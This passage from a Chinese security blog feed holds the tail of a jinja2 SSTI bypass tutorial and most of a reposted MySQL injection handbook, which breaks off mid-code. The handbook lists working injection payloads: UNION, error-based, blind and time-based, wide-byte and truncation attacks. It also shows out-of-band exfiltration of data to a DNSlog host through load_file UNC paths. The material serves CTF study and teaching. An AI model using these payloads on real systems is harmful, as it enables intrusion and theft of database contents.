class="line">      $unicode = dechex(bindec($bin_str));<span class="comment">//返回unicode十六进制</span></span><br><span class="line">      $_sup = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">      <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">4</span> - strlen($unicode); $i++)</span><br><span class="line">      &#123;</span><br><span class="line">          $_sup .= <span class="string">&#x27;0&#x27;</span>;<span class="comment">//补位高字节 0</span></span><br><span class="line">      &#125;</span><br><span class="line">      $str =  <span class="string">&#x27;\\u&#x27;</span> . $_sup . $unicode; <span class="comment">//加上 \u  返回</span></span><br><span class="line">      $resUnicode .= $str;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> $resUnicode;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Unicode编码转字符串方法1</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unicode_decode</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// 转换编码，将Unicode编码转换成可以浏览的utf-8编码</span></span><br><span class="line">  $pattern = <span class="string">&#x27;/([\w]+)|(\\\u([\w]&#123;4&#125;))/i&#x27;</span>;</span><br><span class="line">  preg_match_all($pattern, $name, $matches);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">empty</span>($matches))</span><br><span class="line">  &#123;</span><br><span class="line">    $name = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; count($matches[<span class="number">0</span>]); $j++)</span><br><span class="line">    &#123;</span><br><span class="line">      $str = $matches[<span class="number">0</span>][$j];</span><br><span class="line">      <span class="keyword">if</span> (strpos($str, <span class="string">&#x27;\\u&#x27;</span>) === <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        $code = base_convert(substr($str, <span class="number">2</span>, <span class="number">2</span>), <span class="number">16</span>, <span class="number">10</span>);</span><br><span class="line">        $code2 = base_convert(substr($str, <span class="number">4</span>), <span class="number">16</span>, <span class="number">10</span>);</span><br><span class="line">        $c = chr($code).chr($code2);</span><br><span class="line">        $c = iconv(<span class="string">&#x27;UCS-2&#x27;</span>, <span class="string">&#x27;UTF-8&#x27;</span>, $c);</span><br><span class="line">        $name .= $c;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        $name .= $str;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> $name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Unicode编码转字符串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unicode_decode2</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">  $json = <span class="string">&#x27;&#123;&quot;str&quot;:&quot;&#x27;</span> . $str . <span class="string">&#x27;&quot;&#125;&#x27;</span>;</span><br><span class="line">  $arr = json_decode($json, <span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">empty</span>($arr)) <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">return</span> $arr[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> unicode_encode(<span class="string">&#x27;__class__&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> unicode_decode(<span class="string">&#x27;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#x27;</span>);</span><br><span class="line"><span class="comment">//\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f__class__</span></span><br></pre></td></tr></table></figure>### 魔改字符太湖杯easy_web，上面所说的过滤双大括号，在一些特定的题目可以魔改`&#123;&#123;&#125;&#125;</code>，比如说这道题由于有个字符规范器可以把我们输入的文本标准化，所以可以使用这种方法。</p><p>可以在Unicode字符网站寻找绕过的字符，直接在网址搜索<code>&#123;</code>，就会出现类似的字符，就可以找到<code>︷</code>和<code>︸</code>了，网址：<a href="https://www.compart.com/en/unicode/U+FE38">https://www.compart.com/en/unicode/U+FE38</a></p><p>Payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">︷︷config︸︸</span><br><span class="line">%EF%B8%B7%EF%B8%B7config%EF%B8%B8%EF%B8%B</span><br></pre></td></tr></table></figure><h2 id="Reference">Reference</h2><p><a href="http://www.cl4y.top/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/">http://www.cl4y.top/ssti模板注入学习/</a></p><p><a href="https://xi4or0uji.github.io/2019/01/15/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">https://xi4or0uji.github.io/2019/01/15/flask之ssti模板注入/</a></p><p><a href="https://www.m00nback.xyz/2020/02/16/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">https://www.m00nback.xyz/2020/02/16/Python沙箱逃逸/</a></p><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html#mr4YxS2y">https://www.cnblogs.com/bmjoker/p/13508538.html#mr4YxS2y</a></p><p><a href="https://blog.szfszf.top/article/15/">https://blog.szfszf.top/article/15/</a></p><p><a href="https://p0sec.net/index.php/archives/120/">https://p0sec.net/index.php/archives/120/</a></p><p><a href="https://xz.aliyun.com/t/8029">https://xz.aliyun.com/t/8029</a></p><p><a href="https://xz.aliyun.com/t/7746">https://xz.aliyun.com/t/7746</a></p><p><a href="https://mp.weixin.qq.com/s/_6ObDR5YKpLFoQXTYXE_pQ">https://mp.weixin.qq.com/s/_6ObDR5YKpLFoQXTYXE_pQ</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;jinja2-SSTI-Bypass&quot;&gt;jinja2 SSTI &amp;amp; Bypass&lt;/h1&gt;
&lt;p&gt;本文主要针对jinja2的SSTI做一些讲解和说明。&lt;/p&gt;
&lt;h2 id=&quot;常用的内建属性&quot;&gt;常用的内建属性&lt;/h2&gt;
&lt;h3 id=&quot;class&quot;&gt;&lt;co
      
    
    </summary>
    
    
      <category term="Web安全基础学习" scheme="http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Web安全学习" scheme="http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="SSTI" scheme="http://ca0y1h.top/tags/SSTI/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入手册</title>
    <link href="http://ca0y1h.top/Web_security/basic_learning/27.SQL%E6%B3%A8%E5%85%A5%E6%89%8B%E5%86%8C/"/>
    <id>http://ca0y1h.top/Web_security/basic_learning/27.SQL%E6%B3%A8%E5%85%A5%E6%89%8B%E5%86%8C/</id>
    <published>2020-12-10T15:13:56.000Z</published>
    <updated>2021-01-03T02:50:21.549Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL注入手册【转】">SQL注入手册【转】</h1><blockquote><p>来自https://northity.com/2019/03/02/Sql%E6%B3%A8%E5%85%A5%E6%89%8B%E5%86%8C</p></blockquote><h2 id="常见数据库搭配">常见数据库搭配</h2><ul><li>ASP + ACCESS + IIS</li><li><a href="http://ASP.NET">ASP.NET</a> + MSSQL +IIS</li><li>PHP + Mysql + Apache(Nginx)</li><li>JSP + Oracle(Mysql) + Tomcat</li></ul><p>目前来讲就遇到过这些常见组合，快速判断数据库类型是注入的第一步</p><h2 id="Mysql">Mysql</h2><h3 id="基础">基础</h3><h4 id="数据库名">数据库名</h4><ul><li><p>database()</p></li><li><p>schema()</p></li></ul><h4 id="当前登陆用户">当前登陆用户</h4><ul><li><p>USER()</p></li><li><p>CURRENT_USER()</p></li><li><p>SYSTEM_USER()</p></li><li><p>SESSION_USER()</p></li></ul><h4 id="数据库版本">数据库版本</h4><ul><li><p>VERSION()</p></li><li><p>@@VERSION</p></li><li><p>@@GLOBAL.VERSION</p></li></ul><h4 id="路径相关">路径相关</h4><ul><li><p>@@BASEDIR : mysql安装路径</p></li><li><p>@@SLAVE_LOAD_TMPDIR : 临时文件夹路径</p></li><li><p>@@DATADIR : 数据存储路径</p></li><li><p>@@CHARACTER_SETS_DIR : 字符集设置文件路径</p></li><li><p>@@LOG_ERROR : 错误日志文件路径</p></li><li><p>@@PID_FILE : pid-file文件路径</p></li><li><p>@@BASEDIR : mysql安装路径</p></li><li><p>@@SLAVE_LOAD_TMPDIR : 临时文件夹路径</p></li></ul><h4 id="字符串连接">字符串连接</h4><ul><li>concat(str1,str2) //将字符串首尾相连</li><li>concat_ws(separator,str1,str2) //将字符串用指定连接符连接</li><li>group_concat()//</li></ul><h4 id="字符截断">字符截断</h4><ul><li>left(str,index) //从左边第index开始截取</li><li>right(str,index) //从右边第index开始截取</li><li>substring(str,index) //从左边index开始截取</li><li>substr(str,index,len) //截取str,index开始,截取len的长度</li><li>mid(str,index,ken) //截取str 从index开始,截取len的长度</li></ul><h4 id="字符串比较函数">字符串比较函数</h4><ul><li>strcmp(expr1,expr2)//如果两个字符串是一样则返回0,如果第一个小于第二个则返回-1</li><li>find_in_set(str,strlist) //如果相同则返回1不同则返回0</li></ul><h4 id="注释">注释</h4><ul><li><p>–(后面还有个空格)</p></li><li><p># 单行注释符，url编码为%23</p></li><li><p>/*…*/</p></li><li><p>/! 语句 / 语句会被执行 可用做分割</p></li></ul><h4 id="运算符">运算符</h4><p>比较运算符</p><ul><li><p>=</p></li><li><p>&gt;</p></li><li><p>&lt;</p></li><li><p>!=</p></li><li><p>&lt;&gt; 不等于的意思</p></li><li><p>like (模糊匹配 <code>select '12345' like '12%' =&gt; true</code>)</p></li><li><p>in（<code>select '123' in ('12') =&gt; false</code>）</p></li><li><p>between (<code>select database() between 0x61 and 0x7a;//select database() between 'a' and 'z';</code>)</p></li><li><p>regexp / rlike(正则匹配<code>select '123455' regexp '^12' =&gt; true</code>)</p></li></ul><p>算术运算符</p><ul><li><ul><li></li></ul></li><li>-</li><li><ul><li></li></ul></li><li>/</li></ul><p>逻辑运算符</p><ul><li>not / ！</li><li>and / &amp;&amp;</li><li>or / ||</li><li>xor / ^</li></ul><p>位运算符</p><ul><li>&amp; 按位与</li><li>| 按位或</li><li>^ 按位异或</li><li>! 取反</li><li>&lt;&lt; 左移</li><li>&gt;&gt;右移</li></ul><h4 id="绕过函数">绕过函数</h4><ul><li>instr(str1,substr) //从子字符串中返回子串第一次出现的位置</li><li>lpad(str,len,padstr) rpad(str,len,padstr) // 在str的左(右)两边填充给定的padstr到指定的长度len,返回填充的结果</li></ul><h4 id="延时函数">延时函数</h4><ul><li>sleep()</li><li>benchmark(1000000,sha(1))</li></ul><h4 id="编码函数">编码函数</h4><ul><li>hex()</li><li>ascii()</li></ul><h4 id="文件函数">文件函数</h4><ul><li>load_file() //读文件路径可以用0x，char转换的字符</li><li>outfile <code>select * into outfile '/tmp/test.txt'</code></li><li>dumpfile //用法同上但是只能写入一行数据，常用于udf提权写dll</li></ul><h3 id="构造语句">构造语句</h3><h4 id="条件语句">条件语句</h4><ul><li><code>if(expr1,expr2,expr3)</code> // expr1 true执行expr2否则执行expr3</li><li><code>select case when (条件) then 代码1 else 代码 2 end</code></li></ul><h4 id="information-schema-结构">information_schema 结构</h4><ul><li>information_schema.tables:<br>查询表名:table_name 对应的数据库名: table_schema</li><li>information_schema.columns:<br>查询列名:column_name 对应的表名:table_schemam</li></ul><h4 id="Mysql注入语句一般形式">Mysql注入语句一般形式</h4><ul><li>联合 <code>构造联合语句 + 查询结果</code></li><li>盲注 <code>查询结果 + 比较运算符 + 猜测值</code></li><li>报错 <code>构造报错语句 + 查询结果</code></li></ul><h4 id="Mysql空白字符">Mysql空白字符</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%20 %09 %0a %0b %0c %0d %a0 &#x2F;**&#x2F; tab</span><br><span class="line">%a0 这个不会被php的\s进行匹配</span><br><span class="line">&#x2F;*!*&#x2F; 内敛注释 #这个也可以用来做分隔</span><br></pre></td></tr></table></figure><p>函数名和括号直接可以插入特殊字符 ex</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">concat&#x2F;**&#x2F;()</span><br><span class="line"></span><br><span class="line">information_schema&#x2F;**&#x2F;.&#x2F;**&#x2F;TABLES</span><br><span class="line"></span><br><span class="line">information_schema%0a.%0aTABLES</span><br></pre></td></tr></table></figure><h3 id="判断注入是否存在">判断注入是否存在</h3><p>数值型注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1+1</span><br><span class="line">?id&#x3D;-1 or 1&#x3D;1</span><br><span class="line">?id&#x3D;-1 or 10-2&#x3D;8</span><br><span class="line">?id&#x3D;1 and 1&#x3D;2</span><br><span class="line">?id&#x3D;1 and 1&#x3D;1</span><br></pre></td></tr></table></figure><p>字符型注入<br>参数被引号包围，所以需要闭合引号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;</span><br><span class="line">?id&#x3D;1&quot;</span><br><span class="line">?id&#x3D;1&#39; and &#39;1&#39;&#x3D;&#39;1</span><br><span class="line">?id&#x3D;1&quot; and &quot;1&quot;&#x3D;&quot;1</span><br></pre></td></tr></table></figure><p>闭合后构造语句再注释后面</p><h3 id="四大基本注入类型">四大基本注入类型</h3><h4 id="UNION注入">UNION注入</h4><p>最简单的注入</p><p>用UNION SELECT注入时，若后面要注出的数据的列与原数据列数不同，则会失败。所以需要先猜解列数。</p><p><strong>ORDER BY</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ORDER BY 10 #</span><br><span class="line">ORDER BY 5  #</span><br><span class="line">ORDER BY 2  #</span><br></pre></td></tr></table></figure><p>当ORDER BY的数字大于列数时会返回异常，反复测试，定位出正确的列数</p><p><strong>UNION SELECT</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT 1,2,3 #</span><br><span class="line">UNION ALL SELECT 1,2,3 #</span><br><span class="line">UNION ALL SELECT null,null,null #</span><br></pre></td></tr></table></figure><p><strong>数据库查询</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT GROUP_CONCAT(SCHEMA_NAME) FROM information_schema.SCHEMATA</span><br><span class="line">SELECT DATABASE()  </span><br><span class="line">SELECT schema()</span><br></pre></td></tr></table></figure><p><strong>表查询</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA&#x3D;DATABASE()</span><br><span class="line">SELECT GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA&#x3D;0xffffff</span><br></pre></td></tr></table></figure><p><strong>字段查询</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT GROUP_CONCAT(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME&#x3D;0xffffff</span><br></pre></td></tr></table></figure><p><strong>数据获取</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT GROUP_CONCAT(column_1,column_2) FROM databasename.tablename</span><br><span class="line">SELECT GROUP_CONCAT(column_1,column_2) FROM tablename  </span><br><span class="line">SELECT * FROM tablename</span><br></pre></td></tr></table></figure><h4 id="报错注入">报错注入</h4><p><strong>常见报错payload</strong></p><ul><li><p>floor()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure></li><li><p>updatexml() <a href="//5.1.5">//5.1.5</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;(updatexml(1,concat(0x3a,(select user())),1))</span><br></pre></td></tr></table></figure></li><li><p>extractvalue() <a href="//5.1.5">//5.1.5</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1,concat(0x5c,(select user())))</span><br></pre></td></tr></table></figure></li><li><p>exp() <a href="//5.5.xn--5-bs6a4sito1pkfo13kbusp3f">//5.5.5版本之后可以使用</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select host from user where user &#x3D; &#39;root&#39; and Exp(~(select * from (select version())a));</span><br></pre></td></tr></table></figure></li><li><p>name_const //支持老版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from (select NAME_CONST(version(),0),NAME_CONST(version(),0))x;</span><br></pre></td></tr></table></figure></li><li><p>geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring() 几何函数报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select multipoint((select * from (select * from (select * from (select version())a)b)c));</span><br></pre></td></tr></table></figure></li></ul><h4 id="布尔盲注">布尔盲注</h4><p><strong>常用payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; OR (SELECT ASCII(SUBSTR(DATABASE(),i,1) ) &lt; j) #</span><br></pre></td></tr></table></figure><h4 id="时间盲注">时间盲注</h4><p><strong>常用payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j,BENCHMARK(100000,SHA1(1)),0)</span><br><span class="line">UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j,SLEEP(10),0)</span><br></pre></td></tr></table></figure><p>本质是if做判断然后是否执行sleep，再有回显的bool盲注中则不写延时语句，用0或者1代替</p><p>即查询结果有没有输出到页面是两者的本质区别，没有输出时才是时间盲注</p><p>除开最常见的sleep延时，还有以下姿势</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select benchmark(10000000,sha(1));</span><br></pre></td></tr></table></figure><p><strong>比赛姿势</strong></p><ul><li><p>笛卡尔积</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;</span><br><span class="line">+------------+</span><br><span class="line">| count(*)   |</span><br><span class="line">+------------+</span><br><span class="line">| 2651020120 |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (1 min 51.05 sec)</span><br></pre></td></tr></table></figure></li></ul><p>这种方法又叫做heavy query，可以通过选定一个大表来做笛卡儿积，但这种方式执行时间会几何倍数的提升，在站比较大的情况下会造成几何倍数的效果，实际利用起来非常不好用。</p><ul><li>GET_LOCK</li></ul><p>是pwnhub的一道题目<br>利用场景是有条件限制的：需要提供长连接。在Apache+PHP搭建的环境中需要使用 mysql_pconnect函数来连接数据库。<br>太少用到不赘述了<br><a href="https://zhuanlan.zhihu.com/p/35245598">https://zhuanlan.zhihu.com/p/35245598</a></p><ul><li>RLIKE</li></ul><p>通过rpad或repeat构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;);</span><br><span class="line">+-------------------------------------------------------------+</span><br><span class="line">| rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;) |</span><br><span class="line">+-------------------------------------------------------------+</span><br><span class="line">|                                                           0 |</span><br><span class="line">+-------------------------------------------------------------+</span><br><span class="line">1 row in set (5.27 sec)</span><br></pre></td></tr></table></figure><h3 id="Mysql注入杂技">Mysql注入杂技</h3><h4 id="insert-update-delete注入">insert/update/delete注入</h4><p>这三类语句中可以报错注出数据，但我要写的是如何没有报错的情况下注出数据<br>本质是在闭合语句后通过子查询进行注入，通常为盲注</p><h5 id="update">update</h5><p>一段我在实战中遇到的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$result&#x3D;mysql_query(&quot;update ly set content&#x3D;&#39;$content&#39;,hf_content&#x3D;&#39;$hf_content&#39;,modi_date&#x3D;&#39;$modi_date&#39; where ly_id&#x3D;&#39;$ly_id&#39; &quot;);</span><br><span class="line">if(mysql_affected_rows())</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;&#123;\&quot;success\&quot;:true,\&quot;msg\&quot;:\&quot;回复成功!\&quot;&#125;&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">    echo &quot;&#123;\&quot;success\&quot;:false,\&quot;msg\&quot;:\&quot;回复失败!\&quot;&#125;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>set 和 where 处都可以注入<br>建议在where处进行注入</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and sleep(1) %23</span><br></pre></td></tr></table></figure><p>但是有不少的坑点，因为是根据mysql_affected_rows()判断来进行回显的，所以在update相同的值是并不会affected rows的，但是语句是可以执行的</p><p>但是字符型又有另一个坑点<br>字符型在与数字进行与逻辑运算时会当被做0来处理，所以无法执行and后的sleep。<br>所以我们只能用 <code>or</code>,<code>||</code>,<code>xor</code>,<code>^</code></p><p>但是或逻辑运算中同样存在问题</p><p>（但是具体好像还和mysql版本有关，因为看别人blog字符+or也执行成功了，但是先先不填坑了）<br>测试只有字符为0时才会执行or后的sleep</p><p>应该是和逻辑运算的方式有关，或运算会先检验前面是否为真，只有当前面为字符0时才为假，这是和与运算的不同之处</p><p>异或的坑点和或相似<br>当字符不为数字时不会执行，具体深层原因先留坑吧</p><p>这里还有坑…</p><p>or活着xor都可能导致多次sleep，因为每次检索都会or一次<br>实战中要尽量避免这个问题，能布尔盲注的时候就不要用sleep了<br>要避免这个问题就要用与逻辑且前面为真，放到where就是前面必须where一个存在的值</p><p>测试mysql版本5.3.72</p><h5 id="insert-delete">insert/delete</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into users values (1,&#39;&#123;injecthere&#125;&#39;,&#39;password&#39;);</span><br></pre></td></tr></table></figure><p>类似update，不赘述了</p><h4 id="Order-by注入">Order by注入</h4><p>本质仍然是盲注，根据order by 0 或者 1 返回不同的排序进行注入<br>ctf中的进阶形式为order by 一个特定字段<br>比如hctf中的一道题目</p><h4 id="宽字节注入">宽字节注入</h4><p><strong>原理</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">mysql_query(&quot;SET NAMES &#39;gbk&#39;&quot;);</span><br><span class="line">....</span><br><span class="line">$name &#x3D; isset($_GET[&#39;name&#39;]) ? addslashes($_GET[&#39;name&#39;]) : 1;</span><br><span class="line">$sql &#x3D; &quot;SELECT * FROM test WHERE names&#x3D;&#39;&#123;$name&#125;&#39;&quot;;</span><br></pre></td></tr></table></figure><p>即服务器使用了款字节编码，addslashes会将单引号转义，变为\‘,而宽子节会把两个字符编码为一个汉字，所以如果拼接%df，那%df%5c就会被编码为運字，从而逃逸出转义。</p><p>具体拼接什么要根据数据库使用的编码来决定，可以去查编码表。</p><p>常见payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1%df&#39; #</span><br></pre></td></tr></table></figure><h4 id="Mysql约束攻击">Mysql约束攻击</h4><p><strong>原理</strong><br>主要两个点</p><ul><li>mysql的select查询进行字符串比较的时候,不同长度的字符串,会用空格填充到相同字符在比较。</li><li>mysql插入数据的时候,当数据超过定义的长度会出现截断象限</li></ul><p>利用方式即注册一’admin     a’用户(中间空格超长截断)，达到超长截断的目的，往数据库中写入一个’admin   ’用户，而在select的过程中’admin ‘是与’admin’相等的</p><p>所以就可以用’admin ‘的密码登陆’admin’</p><h4 id="二次注入">二次注入</h4><p>所谓二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。</p><p>二次注入是sql注入的一种，但是比普通sql注入利用更加困难，利用门槛更高。普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。</p><p>二次注入的原理，在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据。</p><p>在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。</p><p>这个。。只能具体情况分析了，不太好写</p><p>比如sql lab-24</p><h4 id="Mysql带外注入">Mysql带外注入</h4><p>带外通道攻击主要是利用其他协议或者渠道从服务器提取数据<br>它可能是HTTP（S）请求，DNS解析服务，SMB服务，Mail服务等</p><h5 id="DNSlog">DNSlog</h5><p>只能用于windows环境</p><p>select拼接一个UNC路径导致请求发起<br>UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。<br>其实我们平常在Widnows中用共享文件的时候就会用到这种网络地址的形式</p><p>\<a href="http://sss.xxx">sss.xxx</a>\test\</p><p>常见payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#39;\\\\&#39;,select hex(version()),&#39;.dnslog地址&#39;)</span><br></pre></td></tr></table></figure><p>这也就解释了为什么CONCAT()函数拼接了4个\了，因为转义的原因，4个\就变成了2个\，目的就是利用UNC路径</p><p>可以直接直接用ceye.io这个平台，这个平台就集成了Dnslog的功能</p><p>利用方法</p><p>首先查看变量确定权限<br>show variables like ‘%secure%’</p><ul><li>当secure_file_priv为空，就可以读取磁盘的目录。</li><li>当secure_file_priv为G:\，就可以读取G盘的文件。</li><li>当secure_file_priv为null，load_file就不能加载文件。</li></ul><p>在mysql 5.5.34版本默认为空可以加载文件 但是之后版本为NULL会禁用函数但是<br>可以通过mysql的配置文件my.ini添加行进行配置</p><p>最好进行加密处理，防止特殊字符导致传输失败<br>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(concat(0x5c5c5c5c,select hex(version()),0x2E66326362386131382E646E736C6F672E6C696E6B2F2F616263));</span><br></pre></td></tr></table></figure><h4 id="文件读写">文件读写</h4><p>查询用户读写权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT file_priv FROM mysql.user WHERE user &#x3D; &#39;username&#39;;</span><br></pre></td></tr></table></figure><ul><li>load_file()</li></ul><p>需要有读取文件的权限<br>需要知道文件的绝对物理路径<br>要读取的文件大小必须小于 max_allowed_packet</p><p>一般没啥问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 